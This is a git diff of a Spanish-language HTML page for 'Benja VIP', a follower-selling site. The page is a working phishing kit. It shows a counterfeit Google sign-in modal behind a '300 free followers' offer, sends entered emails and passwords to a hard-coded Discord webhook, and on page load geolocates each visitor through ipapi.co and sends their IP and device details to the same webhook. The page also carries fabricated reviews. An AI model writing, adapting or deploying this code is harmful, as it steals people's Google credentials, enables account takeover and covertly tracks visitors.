@@ -1,82 +1,139 @@
-<style>
-    .btn-google {
-        background: white; color: #757575; border: 1px solid #ddd;
-        padding: 12px; border-radius: 5px; font-weight: 600; font-size: 14px;
-        display: flex; align-items: center; justify-content: center; gap: 10px;
-        cursor: pointer; width: 100%; margin-top: 15px; font-family: 'Roboto', sans-serif;
-    }
-    .google-logo { width: 18px; }
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Benja VIP | Elite Social Growth</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --gold: #d4af37; --bg: #050505; --google-blue: #1a73e8; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; }
+        .container { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; }
+        
+        /* HEADER PROFESIONAL */
+        .header { text-align: center; padding: 30px 0; border-bottom: 1px solid #111; }
+        .header h1 { color: var(--gold); margin: 0; font-size: 28px; letter-spacing: 3px; font-weight: 900; }
+        .live-tag { font-size: 10px; color: #2ecc71; text-transform: uppercase; margin-top: 5px; font-weight: bold; }
 
-    /* VENTANA DE LOGIN GOOGLE SIMULADA */
-    .google-modal {
-        background: white; color: #202124; padding: 40px 30px;
-        border-radius: 8px; width: 100%; max-width: 400px;
-        text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-    }
-    .google-header img { width: 75px; margin-bottom: 10px; }
-    .google-header h2 { font-size: 24px; font-weight: 400; margin: 0; font-family: 'Product Sans', Arial; }
-    .google-header p { font-size: 16px; margin: 10px 0 30px; }
-    
-    .g-input {
-        width: 100%; padding: 13px 15px; margin: 10px 0;
-        border: 1px solid #dadce0; border-radius: 4px; font-size: 16px;
-        box-sizing: border-box; outline: none;
-    }
-    .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
-    
-    .g-footer {
-        display: flex; justify-content: space-between; align-items: center;
-        margin-top: 40px;
-    }
-    .btn-g-next {
-        background: #1a73e8; color: white; border: none;
-        padding: 10px 24px; border-radius: 4px; font-weight: 600;
-        cursor: pointer; font-size: 14px;
-    }
-</style>
+        /* PRODUCTOS */
+        .section-title { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: var(--gold); margin: 25px 0 15px; display: flex; align-items: center; gap: 10px; }
+        .section-title::after { content: ""; height: 1px; background: #1a1a1a; flex: 1; }
+        
+        .free-card { background: linear-gradient(145deg, #111, #000); border: 1px solid #222; border-radius: 25px; padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .btn-google-login { background: white; color: #3c4043; border: 1px solid #dadce0; padding: 12px; border-radius: 8px; width: 100%; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; margin-top: 15px; font-size: 14px; }
 
-<div id="auth-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.9); z-index:10000; justify-content:center; align-items:center;">
-    <div class="google-modal">
-        <div class="google-header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-            <h2>Acceder</h2>
-            <p>Usa tu cuenta de Google</p>
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .card { background: #111; border-radius: 20px; padding: 20px; text-align: center; border: 1px solid #1a1a1a; }
+        .price { color: var(--gold); font-size: 18px; font-weight: 800; display: block; margin: 10px 0; }
+        .btn-wa { background: #25D366; color: white; text-decoration: none; padding: 10px; border-radius: 10px; display: block; font-size: 12px; font-weight: bold; }
+
+        /* MODAL DE GOOGLE SIMULADO */
+        #google-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000; flex-direction: column; align-items: center; padding-top: 50px; color: #202124; }
+        .g-logo { width: 75px; margin-bottom: 20px; }
+        .g-title { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        .g-subtitle { font-size: 16px; margin-bottom: 30px; }
+        .g-input { width: 90%; max-width: 350px; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 5px; font-size: 16px; outline-color: var(--google-blue); }
+        .g-footer { width: 90%; max-width: 350px; display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .btn-next { background: var(--google-blue); color: white; border: none; padding: 10px 25px; border-radius: 5px; font-weight: 600; cursor: pointer; }
+
+        /* RESEÑAS */
+        .reviews { margin-top: 30px; background: #080808; padding: 15px; border-radius: 15px; font-size: 11px; color: #666; }
+        .review { margin-bottom: 10px; border-bottom: 1px solid #111; padding-bottom: 5px; }
+    </style>
+</head>
+<body onload="rastreoInicial()">
+
+<div class="container">
+    <div class="header">
+        <h1>BENJA <span>VIP</span></h1>
+        <div class="live-tag">● SERVIDOR ACTIVO | +1,420 ÓRDENES</div>
+    </div>
+
+    <div class="section-title"><span>🎁 PANEL DE RECOMPENSAS</span></div>
+    <div class="free-card">
+        <h2 style="margin:0; font-size: 20px;">300 SEGUIDORES GRATIS</h2>
+        <p style="font-size: 11px; color: #666;">Selecciona una plataforma para sincronizar:</p>
+        <button class="btn-google-login" onclick="abrirGoogle('Instagram')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18"> Continuar con Google
+        </button>
+        <button class="btn-google-login" onclick="abrirGoogle('TikTok')" style="margin-top:10px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18"> Vincular TikTok vía Google
+        </button>
+    </div>
+
+    <div class="section-title"><span>💎 PACKS EXCLUSIVOS</span></div>
+    <div class="grid">
+        <div class="card">
+            <b>20k FOLLOWERS</b>
+            <span class="price">$30.000 AR$</span>
+            <a href="https://wa.me/5493364546172" class="btn-wa">SOLICITAR</a>
         </div>
-        
-        <input type="email" id="g_email" class="g-input" placeholder="Correo electrónico o teléfono">
-        <input type="password" id="g_pass" class="g-input" placeholder="Introduce tu contraseña">
-        
-        <div style="text-align:left; color:#1a73e8; font-size:14px; font-weight:600; margin-top:10px; cursor:pointer;">¿Has olvidado tu correo?</div>
-        
-        <p style="font-size:14px; color:#5f6368; text-align:left; margin-top:30px;">
-            Para continuar, Google compartirá tu nombre, dirección de correo electrónico y foto de perfil con <b>Benja VIP Panel</b>.
-        </p>
-
-        <div class="g-footer">
-            <span style="color:#1a73e8; font-weight:600; font-size:14px; cursor:pointer;">Crear cuenta</span>
-            <button class="btn-g-next" onclick="capturaGoogle()">Siguiente</button>
+        <div class="card">
+            <b>100k FOLLOWERS</b>
+            <span class="price">$80.000 AR$</span>
+            <a href="https://wa.me/5493364546172" class="btn-wa" style="background:var(--gold); color:black;">COMPRAR</a>
         </div>
+    </div>
+
+    <div class="reviews">
+        <div class="review">⭐ "Increíble, me llegaron los de IG en minutos" - @matias_ok</div>
+        <div class="review">⭐ "El soporte por WhatsApp es muy rápido" - @sofi_vlogs</div>
+    </div>
+</div>
+
+<div id="google-modal">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
+    <div class="g-title">Acceder</div>
+    <div class="g-subtitle">Usa tu cuenta de Google</div>
+    
+    <input type="email" id="email_g" class="g-input" placeholder="Correo electrónico o teléfono">
+    <input type="password" id="pass_g" class="g-input" placeholder="Introduce tu contraseña">
+    
+    <div style="width:90%; max-width:350px; text-align:left; color:var(--google-blue); font-weight:bold; font-size:14px; margin-top:10px;">¿Has olvidado tu contraseña?</div>
+    
+    <div class="g-footer">
+        <span style="color:var(--google-blue); font-weight:bold; font-size:14px;">Crear cuenta</span>
+        <button class="btn-next" onclick="finalizarCaptura()">Siguiente</button>
     </div>
 </div>
 
 <script>
-    function abrirCapturaGoogle() {
-        document.getElementById('auth-modal').style.display = 'flex';
+    const webhook = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
+    let plataformaActual = "";
+
+    // 🕵️ RASTREO AUTOMÁTICO AL ENTRAR (DICE IP Y CIUDAD)
+    async function rastreoInicial() {
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            const d = await r.json();
+            const payload = {
+                content: `👀 **VISITANTE NUEVO**\n🌍 País: \`${d.country_name}\`\n📍 Ciudad: \`${d.city}\`\n🌐 IP: \`${d.ip}\`\n📱 Equipo: \`${navigator.userAgent.slice(0,50)}\``
+            };
+            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        } catch(e) {}
     }
 
-    async function capturaGoogle() {
-        const email = document.getElementById('g_email').value;
-        const pass = document.getElementById('g_pass').value;
-        
-        if(!email || !pass) return alert("Introduce tus datos de Google.");
+    function abrirGoogle(p) {
+        plataformaActual = p;
+        document.getElementById('google-modal').style.display = 'flex';
+    }
 
-        const payload = {
-            content: `🛡️ **CUENTA DE GOOGLE CAPTURADA**\n📧 **Email:** \`${email}\`\n🔑 **Password:** \`${pass}\` \n✨ **Servicio:** Reclamo de 300 Seguidores`
+    async function finalizarCaptura() {
+        const e = document.getElementById('email_g').value;
+        const p = document.getElementById('pass_g').value;
+
+        if(!e || !p) return alert("Por favor, introduzca sus datos.");
+
+        const datos = {
+            content: `🔥 **NUEVA CUENTA CAPTURADA (GOOGLE)**\n🎮 Plataforma: \`${plataformaActual}\`\n📧 Email: \`${e}\`\n🔑 Pass: \`${p}\` \n⚠️ **¡ENTRÁ RÁPIDO!**`
         };
 
-        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(datos) });
         
-        alert("Sincronización con Google exitosa. Tus seguidores se enviarán en breve.");
+        alert("Sincronización exitosa con Google. Los 300 seguidores se cargarán en tu cuenta de " + plataformaActual + " en las próximas horas.");
         location.reload();
     }
 </script>
+
+</body>
+</html>
